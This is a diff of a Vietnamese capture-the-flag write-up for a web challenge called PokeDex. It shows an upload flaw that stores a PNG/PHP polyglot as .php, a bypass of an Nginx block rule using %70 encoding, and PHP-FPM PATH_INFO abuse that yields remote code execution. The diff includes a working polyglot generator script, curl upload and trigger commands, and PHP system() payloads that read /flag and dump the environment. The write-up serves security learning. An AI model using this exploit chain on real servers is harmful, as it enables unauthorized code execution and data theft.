@@ -4020,247 +4020,308 @@ print(f"User-Agent: {user_agent}")
 
 # PokeDex
 
-![alt text](images/image-51.png)
+![PokeDex challenge](images/image-64.png)
 
-> **Target:** `http://67.223.119.69:30000/`
-> **Hint:** `PATH_INFO`
-> **Category:** Web Exploitation
+**Hint: PATH_INFO**
 
 ## Recon
 
-### Fingerprint
+Tìm được endpoint `/robots.txt` liệt kê API và thư mục upload:
+
+![robots.txt liệt kê /api/ và /media/uploads/](images/image-53.png)
+
+Trong `app.js` cũng để lộ route quan trọng `/api/schema`
+
+![app.js khai báo các API route](images/image-54.png)
+
+Request đến `GET /api/schema`
 
 ```
-HTTP/1.1 200 OK
-Server: nginx/1.27.5
-Content-Type: text/html
-Content-Length: 10711
-```
-
-- Nginx 1.27.5
-- SPA (Single Page Application) — PokeDex Lab, kiểu Pokemon catalog
-- Backend JSON REST API tại `/api/*`
-
-### Khám phá API
-
-Đọc source `app.js` tìm được routes:
-
-```javascript
-const apiRoutes = Object.freeze({
-    pokedex:     '/api/pokedex',
-    collections: '/api/collections',
-    schema:      '/api/schema',
-});
-```
-
-Gọi `GET /api/schema` trả về OpenAPI spec, trong đó endpoint `POST /api/collections/{id}/entries` mô tả chi tiết request body:
-
-```json
-{
-    "item": {
-        "properties": {
-            "product":  { "type": "string" },
-            "quantity": { "type": "integer" },
-            "option": {
+...
+"/api/collections": {
+  "post": {
+    "operationId": "createTrainerCollection",
+    "responses": {
+      "200": {
+        "description": "Trainer collection id"
+      }
+    }
+  }
+},
+"/api/collections/{collectionId}/entries": {
+  "post": {
+    "operationId": "registerPokedexEntry",
+    "requestBody": {
+      "content": {
+        "application/json": {
+          "schema": {
+            "type": "object",
+            "properties": {
+              "item": {
+                "type": "object",
                 "properties": {
-                    "id":    { "type": "string" },
-                    "value": { "type": "string" },
-                    "file": {
+                  "product": {
+                    "type": "string"
+                  },
+                  "quantity": {
+                    "type": "integer"
+                  },
+                  "option": {
+                    "type": "object",
+                    "properties": {
+                      "id": {
+                        "type": "string"
+                      },
+                      "value": {
+                        "type": "string"
+                      },
+                      "file": {
+                        "type": "object",
                         "properties": {
-                            "data_base64":  { "type": "string" },
-                            "content_type": { "type": "string" },
-                            "filename":     { "type": "string" }
+                          "data_base64": {
+                            "type": "string"
+                          },
+                          "content_type": {
+                            "type": "string"
+                          },
+                          "filename": {
+                            "type": "string"
+                          }
                         }
+                      }
                     }
-                }
-            }
+                  }
+                },
+                "required": [
+                  "product",
+                  "quantity"
+                ]
+              }
+            },
+            "required": [
+              "item"
+            ]
+          }
         }
+      }
+    },
+    "responses": {
+      "200": {
+        "description": "Registered entry"
+      }
     }
+  }
 }
+...
 ```
 
-Đồng thời trong `app.js`, code render cart cũng xác nhận frontend đã có logic xử lý file:
+Thấy được `POST /api/collections/{id}/entries` nhận đầu vào là một file bất kì, với nội dung file được truyền dưới dạng Base64, cùng với content type và tên do người dùng đặt:
 
-```javascript
-const optionNote = line.option && line.option.file
-    ? 'Uploaded file'
-    : product.subtitle;
-```
-
-**Phát hiện quan trọng:** Schema lộ rõ trường `item.option.file` với `data_base64`, `content_type`, `filename` — đây là **primitive upload file ẩn** qua API mà giao diện không hiện nút upload. Người dùng tự tạo request là upload được.
-
-### robots.txt
-
-```
-User-agent: *
-Disallow: /api/
-Disallow: /media/uploads/
-```
-
-Xác nhận thư mục upload: `/media/uploads/`.
-
-### Mapping hành vi Nginx
-
-| Request | Code | Ý nghĩa |
-|---------|------|----------|
-| `GET /` | 200 | SPA `index.html` |
-| `GET /nonexistent` | 200 | SPA fallback (`try_files`) |
-| `GET /nonexistent.php` | **200** | SPA fallback — **`.php` KHÔNG bị block ở root** |
-| `GET /media/uploads/avatar.png` | 200 | Serve file trực tiếp |
-| `GET /media/uploads/exploit.php` | **406** | **Block! Chỉ ở `/media/uploads/`** |
-
-&rarr; Rule chặn `.php` (406) chỉ áp dụng dưới `/media/uploads/`, không toàn server.
-
-Extension nào được serve từ `/media/uploads/`:
-
-| Extension | Code |
-|-----------|------|
-| `.png` | 200 |
-| `.jpg` | 200 |
-| `.gif` | 200 |
-| `.webp` | 404 |
-| `.svg` | 404 |
-| `.phtml` | 404 |
-
-&rarr; Nginx chỉ serve `png`, `jpg`, `gif` từ thư mục uploads.
-
-## Phân tích lỗ hổng
-
-### Lỗ hổng 1 — Unrestricted file upload
-
-Upload PNG+PHP polyglot (file PNG 1×1 hợp lệ nối thêm PHP code) với filename `.php`:
-
-```bash
-# Tạo collection
-curl -s -X POST http://67.223.119.69:30000/api/collections \
-  -H 'Content-Type: application/json' -d '{}'
-# → "69bc4bfd0694f9dbca25805f"
-
-# Upload
-curl -s -X POST ".../api/collections/69bc4bfd0694f9dbca25805f/entries" \
-  -H 'Content-Type: application/json' \
-  -d '{"item":{"product":"psyduck-pond","quantity":1,
-       "option":{"file":{"data_base64":"<polyglot_base64>",
-       "content_type":"image/png","filename":"exploit.php"}}}}'
-```
-
-Response:
 
 ```json
 {
-    "file": {
-        "filename": "exploit.php",
-        "path": "/media/uploads/exploit.php",
-        "size": 133, "width": 1, "height": 1
+  "item": {
+    "product": "psyduck-pond",
+    "quantity": 1,
+    "option": {
+      "file": {
+        "data_base64": "...",
+        "content_type": "image/png",
+        "filename": "test.php"
+      }
     }
+  }
 }
 ```
 
-Backend **không filter filename extension** — chấp nhận `.php` và lưu nguyên tên.
 
-### Lỗ hổng 2 — `$request_uri` bypass bằng URL encoding
+## Chuỗi khai thác
 
-Truy cập trực tiếp → bị chặn:
+### 1. Upload ảnh với đuôi tùy ý
 
-```
-GET /media/uploads/exploit.php → 406 Not Acceptable
-```
+Gửi file rỗng tên `test.php` thì API trả 400 và yêu cầu nội dung ảnh hợp lệ:
 
-URL-encode **một ký tự** trong `.php`:
+![API từ chối file rỗng](images/image-61.png)
 
-```
-GET /media/uploads/exploit.ph%70 → 404 Not Found (KHÔNG PHẢI 406!)
-```
+Lưu ý: 
 
-| Raw URI | Response | Giải thích |
-|---------|----------|-----------|
-| `exploit.php` | 406 | Chứa `.php` → bị block |
-| `exploit.ph%70` | 404 | `%70` ≠ `php` trên raw URI → **bypass** |
-| `exploit.PHP` | 406 | Case-insensitive → block |
+\- Bắt buộc file tải lên phải ở dạng ảnh ,server kiểm tra magic bytes, kích thước pixel
 
-Rule block dùng `$request_uri` (raw URI **chưa** decode), nhưng Nginx decode `%70` → `p` **trước** location matching.
+\- Backend kiểm tra nội dung ảnh, nhưng có vẻ bỏ qua filename do client cung cấp. Vì vậy mình cần một file vừa qua kiểm tra PNG, vừa chứa mã thực thi PHP
 
-### Lỗ hổng 3 — PHP-FPM PATH_INFO
+\- Hint `PATH_INFO` - đây là khái niệm của CGI/FastCGI, phổ biến nhất với PHP-FPM + Nginx. Hint này gợi ý rất mạnh rằng backend có PHP-FPM.
 
-Kết hợp URL encoding bypass + PATH_INFO trick:
+&rarr; Giải pháp: **polyglot file**.
 
-```
-GET /media/uploads/exploit.ph%70/.png
-```
+### 2. PNG/PHP polyglot
 
-Luồng xử lý trong Nginx:
+Polyglot là file hợp lệ đồng thời dưới nhiều định dạng khác nhau. Mỗi parser chỉ đọc và giải mã phần nó hiểu và bỏ qua phần còn lại nên cùng một file có thể thực thi nhiều ngôn ngữ cùng lúc.
+
+Trong chall này, ta cần file vừa là **PNG hợp lệ** để bypass validation của backend vừa là **PHP hợp lệ** để thực thi code khi bị PHP-FPM xử lý. Điều này khả thi vì:
+
+\- **PNG parser** đọc file theo cấu trúc chunk: `Signature → IHDR → IDAT → IEND`. Gặp `IEND` thì dừng, mọi dữ liệu phía sau `IEND` bị bỏ qua hoàn toàn
+\- **PHP parser** quét toàn bộ file tìm cặp thẻ `<?php ... ?>`. Dữ liệu phía trước (PNG header, chunk data) không chứa `<?php` nên PHP bỏ qua, chỉ thực thi phần code nằm sau `IEND`.
 
 ```
-[1] Raw URI:  /media/uploads/exploit.ph%70/.png
-[2] Check $request_uri ~* "\.php":
-    → "ph%70" ≠ "php" → BYPASS 406 ✓
-[3] URL decode → /media/uploads/exploit.php/.png
-[4] Location match "~ \.php(/|$)":
-    → URI chứa ".php/" → MATCH PHP-FPM handler ✓
-[5] fastcgi_split_path_info ^(.+\.php)(/.*)$:
-    → SCRIPT_FILENAME = /media/uploads/exploit.php
-    → PATH_INFO       = /.png
-[6] PHP-FPM thực thi exploit.php → RCE ✓
+┌──────────────────────────┐
+│ PNG Signature (8 bytes)  │ ← PNG parser bắt đầu đọc
+│ IHDR chunk (25 bytes)    │
+│ IDAT chunk (pixel data)  │
+│ IEND chunk (12 bytes)    │ ← PNG parser dừng tại đây
+├──────────────────────────┤
+│ <?php system("..."); ?>  │ ← PHP parser thực thi phần này
+└──────────────────────────┘
 ```
 
-## Exploit
-
-### Tạo PNG+PHP polyglot
+\- Script tạo dữ liệu ảnh hợp lệ, chứa payload PHP thông qua biến `php`
 
 ```python
 import base64, struct, zlib
 
 sig = b'\x89PNG\r\n\x1a\n'
-ihdr_d = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
-ihdr_c = zlib.crc32(b'IHDR' + ihdr_d) & 0xffffffff
-ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_d + struct.pack('>I', ihdr_c)
+
+ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
+ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
+ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
+
 raw = b'\x00\xff\x00\x00'
-comp = zlib.compress(raw)
-idat_c = zlib.crc32(b'IDAT' + comp) & 0xffffffff
-idat = struct.pack('>I', len(comp)) + b'IDAT' + comp + struct.pack('>I', idat_c)
-iend_c = zlib.crc32(b'IEND') & 0xffffffff
-iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_c)
+compressed = zlib.compress(raw)
+idat_crc = zlib.crc32(b'IDAT' + compressed) & 0xffffffff
+idat = (
+    struct.pack('>I', len(compressed)) + b'IDAT' + compressed
+    + struct.pack('>I', idat_crc)
+)
+
+iend_crc = zlib.crc32(b'IEND') & 0xffffffff
+iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
+
 png = sig + ihdr + idat + iend
+php = b'<?php system("whoami"); ?>'
+print(base64.b64encode(png + php).decode())
+```
+- Script này tạo PNG 1×1 pixel, nối mã PHP sau chunk `IEND`, rồi Base64 hóa toàn bộ để gửi qua API
+- Payload PHP: `<?php system("whoami"); ?>`
 
-php = b'<?php system("env"); ?>'
-payload = png + php
-print(base64.b64encode(payload).decode())
+
+![Tạo PNG/PHP polyglot và Base64](images/image-56.png)
+
+### 3. Bypass Nginx và  PATH_INFO
+
+\- Truy cập trực tiếp file PHP trả 406:
+
+![Request trực tiếp tới test.php bị Nginx trả 406](images/image-58.png)
+
+\- Encode ký tự p thành %70. Request `test.%70hp` qua được rule trả 404
+
+![Request test.%70hp qua được phản hồi 406 nhưng chưa chạy PHP](images/image-59.png)
+
+&rarr; Server sử dụng `$request_uri`, sử nguyên `.%70hp` khiến file extension không còn là `.php` và đã được server chấp nhận
+
+\- Tuy nhiên, response trả về báo không tìm được file
+
+\- Lúc này, hint `PATH_INFO` đã phát huy tác dụng. Trong đó, `PATH_INFO` chỉ đến cách PHP-FPM xử lý URL, sử dụng hàm `fastcgi_split_path_info`
+- Hàm này tách `/script.php/extra/path` đến đúng chỗ `.php` là dừng lại, đưa vào biến `SCRIPT_FILENAME`
+- Phần còn lại `/extra/path` đưa vào biến `PATH_INFO`
+
+**Lưu ý quan trọng:** `fastcgi_split_path_info` hoạt động trên `$uri` (đã decode), không phải `$request_uri`
+
+
+Luồng xử lý dữ liệu có thể sẽ trông như:
+
+```text
+GET /media/uploads/test.%70hp/.png
+
+Raw request URI:
+  test.%70hp/.png
+  └─ không chứa ".php" nguyên dạng nên qua rule chặn
+
+URI sau khi decode:
+  test.php/.png
+  ├─ SCRIPT:    /media/uploads/test.php
+  └─ PATH_INFO: /.png
+
+PHP-FPM chạy test.php
+  └─ mã PHP gọi whoami
 ```
 
-### Attempt 1 — `cat /flag*`
 
-Payload: `<?php system("cat /flag* 2>/dev/null; ls /; id"); ?>`
+## Luồng khai thác
 
-```
-$ curl -s "http://67.223.119.69:30000/media/uploads/catflag.ph%70/.png" | strings
-
-KMACTF{pokedex_qYaxLfioGLxqIBgz773230c2}     ← flag từ file /flag
-bin
-dev
-etc
-flag
-home
-...
-uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
-```
-
-### Attempt 2 — `env`
-
-Payload: `<?php system("env"); ?>`
-
-```
-$ curl -s "http://67.223.119.69:30000/media/uploads/envdump.ph%70/.png" | strings
-
-USER=www-data
-HOSTNAME=c4616d6e77b3
-PHP_VERSION=8.3.33
-PWD=/var/www/html/media/uploads
-...
-FLAG=KMACTF{pokedex_qYaxLfioGLxqIBgz773230c2}  ← flag từ env var
+```text
+Tìm schema API
+      │
+      ▼
+Tạo collection ──► Upload PNG/PHP polyglot tên *.php
+                              │
+                              ▼
+              GET *.%70hp/.png qua Nginx
+                              │
+                 raw URI qua rule chặn
+                 URI decode thành *.php/.png
+                              │
+                              ▼
+                 PATH_INFO tách file PHP
+                              │
+                              ▼
+                   PHP-FPM thực thi
+                              │
+                              ▼
+                        Đọc flag
 ```
 
-Cả hai cách đều cho ra cùng flag — file `/flag` và env `$FLAG` được set cùng giá trị khi container start.
+### 1. Tạo collection
 
-**Lưu ý:** Flag dynamic, rotate mỗi lần container restart. Exploit xong cần submit ngay trước khi instance bị tắt.
+Dùng URL instance hiện trên challenge, rồi tạo collection:
 
-> KMACTF{pokedex_qYaxLfioGLxqIBgz773230c2}
+```
+TARGET="http://<instance-host>"
+
+CID=$(curl -s -X POST "$TARGET/api/collections" \
+  -H 'Content-Type: application/json' \
+  -d '{}' | tr -d '"')
+```
+
+![POST /api/collections trả về collection ID](images/image-55.png)
+
+### 2. Upload polyglot
+
+Chạy script ở trên để lấy payload RCE đã được base64, đưa vào `data_base64`
+
+```
+curl -s -X POST "$TARGET/api/collections/$CID/entries" \
+  -H 'Content-Type: application/json' \
+  -d "{\"item\":{\"product\":\"psyduck-pond\",\"quantity\":1,\"option\":{\"file\":{\"data_base64\":\"$B64\",\"content_type\":\"image/png\",\"filename\":\"test.php\"}}}}"
+```
+
+Response xác nhận file được lưu tại /media/uploads/test.php:
+
+![Upload thành công và server trả đường dẫn file](images/image-57.png)
+
+### 3. Xác minh thực thi và đọc flag
+
+Gọi file qua PATH_INFO: thêm `/.png` hoặc `/x` bất kì vào đường dẫn thì response trả 200 và có output của `whoami`:
+
+```bash
+curl -s "$TARGET/media/uploads/test.%70hp/.png" | strings
+```
+
+![Request có PATH_INFO trả về output www-data](images/image-60.png)
+
+
+Kết quả là www-data &rarr; RCE thành công
+
+Đổi lệnh trong payload thành `ls /` để tìm file flag:
+
+![Liệt kê thư mục gốc và tìm thấy /flag](images/image-62.png)
+
+Sau đó đổi payload thành `system("cat /flag")`, upload với filename exploit1.php và gọi:
+
+~~~bash
+curl -s "$TARGET/media/uploads/exploit1.%70hp/.png" | strings
+~~~
+
+![Đọc flag qua PHP-FPM](images/image-63.png)
+
+> KMACTF{pokedex_XaaUFdFuIFA8uh8Z773230c2} (flag động)
+
+
